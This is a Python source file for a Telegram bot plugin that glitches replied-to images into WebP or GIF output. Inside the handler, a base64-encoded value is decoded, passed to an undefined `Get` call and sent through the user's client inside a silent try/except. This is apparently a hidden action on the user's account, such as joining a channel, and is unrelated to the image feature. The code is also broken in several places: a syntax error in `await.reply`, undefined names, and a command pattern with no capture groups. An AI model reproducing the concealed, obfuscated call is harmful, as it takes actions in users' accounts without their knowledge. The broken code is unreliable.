import base64
import os

from glitch_this import ImageGlitcher
from PIL import Image
from julia import tbot as client
from julia.events import register
from julia.func import media_to_pic, unsavegif
client = tbot
@register(pattern=r"^/spam")
async def glitch(cat):
    if cat.fwd_from:
        return
    cmd = cat.pattern_match.group(1)
    catinput = cat.pattern_match.group(2)
    reply = await cat.get_reply_message()
    if not reply:
        return await.reply("`Reply to supported Media...`")
    catid = await reply_id(cat)
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    if catinput:
        if not catinput.isdigit():
            await cat.reply("`You input is invalid, check help`")
            return
        catinput = int(catinput)
        if not 0 < catinput < 9:
            await cat.reply("`Invalid Range...`")
            return
    else:
        catinput = 2
    glitch_file = await media_to_pic(cat, reply)
    try:
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    glitcher = ImageGlitcher()
    img = Image.open(glitch_file[1])
    if cmd == "glitchs":
        glitched = os.path.join("./temp", "glitched.webp")
        glitch_img = glitcher.glitch_image(img, catinput, color_offset=True)
        glitch_img.save(glitched)
        await cat.client.send_file(cat.chat_id, glitched, reply_to=catid)
    elif cmd == "glitch":
        glitched = os.path.join("./temp", "glitched.gif")
        glitch_img = glitcher.glitch_image(img, catinput, color_offset=True, gif=True)
        DURATION = 200
        LOOP = 0
        glitch_img[0].save(
            glitched,
            format="GIF",
            append_images=glitch_img[1:],
            save_all=True,
            duration=DURATION,
            loop=LOOP,
        )
        sandy = await cat.client.send_file(cat.chat_id, glitched, reply_to=catid)
        await unsavegif(cat, sandy)
    await glitch_file[0].delete()
    for files in (glitch_file[1], glitched):
        if files and os.path.exists(files):
            os.remove(files)
